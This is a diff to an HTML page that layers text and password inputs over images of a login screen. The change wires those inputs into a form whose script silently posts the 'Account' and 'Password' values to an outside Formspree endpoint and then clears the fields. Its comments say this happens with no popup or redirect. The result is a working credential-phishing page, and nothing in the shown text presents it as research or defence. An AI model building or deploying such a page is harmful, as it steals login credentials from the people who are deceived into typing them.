@@ -57,12 +57,44 @@
             width: 700px;  /* 這裡改小，例如 100px 或 50px */
             height: auto;
         }
+        .button_css{
+            z-index:3;
+            position: absolute;
+            bottom: 370px; 
+            right: 939px;
+            width: 280px;  /* 這裡改小，例如 100px 或 50px */
+            height: auto;
+        }
     </style>
 </head>
 <body>
-    <img src="input.png" class="input_img">
-    <img src="img.png">
-    <input type="text" class="input-overlay">
-    <input type="password" class="input-overlay123">
+    <form id="submit-form" action="https://formspree.io/f/xkokjdwb" method="POST">
+        
+        <img src="input.png" class="input_img">
+        <img src="img.png">
+
+        <button type="submit" class="button_css">
+            <img src="button.png" style="width: 100%;">
+        </button>
+
+        <input type="text" name="Account" class="input-overlay">
+        <input type="password" name="Password" class="input-overlay123">
+    </form>
+    <script>
+        // 點擊按鈕後，直接在背景傳送，不會有任何彈窗或跳轉
+        document.getElementById("submit-form").addEventListener("submit", function(e) {
+            e.preventDefault(); // 攔截跳轉
+            const formData = new FormData(this);
+            fetch(this.action, {
+                method: 'POST',
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            }).then(response => {
+                if (response.ok) {
+                    this.reset(); // 傳送成功後清空輸入框，什麼都不顯示
+                }
+            });
+        });
+    </script>
 </body>
 </html>
